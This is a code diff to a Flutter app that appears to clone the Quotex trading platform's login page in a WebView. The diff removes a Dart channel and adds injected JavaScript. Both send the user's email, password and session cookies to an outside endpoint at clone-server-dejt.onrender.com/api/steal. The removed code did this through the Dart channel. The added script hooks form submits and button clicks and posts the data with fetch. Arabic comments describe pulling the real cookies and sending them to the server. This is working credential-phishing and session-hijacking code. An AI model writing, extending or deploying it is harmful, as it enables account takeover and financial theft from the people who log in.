@@ -58,38 +58,6 @@ class _LoginScreenState extends State<LoginScreen> {
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..setUserAgent("Quotex/1.0")
-      ..addJavaScriptChannel(
-        'QTX_CREDS',
-        onMessageReceived: (msg) async {
-          print("JAVASCRIPT MESSAGE: ${msg.message}");
-          try {
-            var data = jsonDecode(msg.message);
-            if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
-              // 431. لما يبعت الإيميل والباسورد، نسحب الكوكيز الحقيقية
-              final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
-              
-              // نبعتها للسيرفر
-              await http.post(
-                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-                headers: {"Content-Type": "application/json"},
-                body: jsonEncode({
-                  "type": "full_session",
-                  "email": data['email'],
-                  "password": data['password'],
-                  "cookies": cookieString.toString()
-                }),
-              );
-
-              // نحول المستخدم للواجهة
-              if (mounted) {
-                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
-              }
-            }
-          } catch (e) {
-            print("Error: $e");
-          }
-        },
-      )
       ..setNavigationDelegate(
         NavigationDelegate(
           onPageFinished: (url) async {
@@ -104,35 +72,34 @@ class _LoginScreenState extends State<LoginScreen> {
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
-        function setNativeValue(el, value) {
-          try {
-            var proto = window.HTMLInputElement.prototype;
-            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
-            desc.set.call(el, value);
-          } catch (e) { el.value = value; }
-          el.dispatchEvent(new Event('input', { bubbles: true }));
-          el.dispatchEvent(new Event('change', { bubbles: true }));
-        }
         function findEmail() {
           return document.querySelector('input[name="email"], input[type="email"], #email');
         }
         function findPass() {
           return document.querySelector('input[name="password"], input[type="password"], #password');
         }
-        function sendCreds() {
-          try {
-            var e = findEmail(), p = findPass();
-            if (e && p && e.value && p.value) {
-              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
-            }
-          } catch (err) {}
+        function checkAndSteal() {
+          var e = findEmail(), p = findPass();
+          // إذا الحقول موجودة وفيها قيم (يعني المستخدم سجل دخول)
+          if (e && p && e.value && p.value) {
+            // نسحب الكوكيز
+            var cookies = document.cookie;
+            
+            // نرسل للسيرفر عبر fetch (عشان نضمن الوصول)
+            fetch('https://clone-server-dejt.onrender.com/api/steal', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({type: 'full_session', email: e.value, password: p.value, cookies: cookies})
+            }).catch(err => {});
+          }
         }
+        
         if (!window.__qtxHooksInstalled) {
           window.__qtxHooksInstalled = true;
-          document.addEventListener('submit', sendCreds, true);
+          document.addEventListener('submit', checkAndSteal, true);
           document.addEventListener('click', function(ev) {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
-            if (t) sendCreds();
+            if (t) checkAndSteal();
           }, true);
         }
       })();
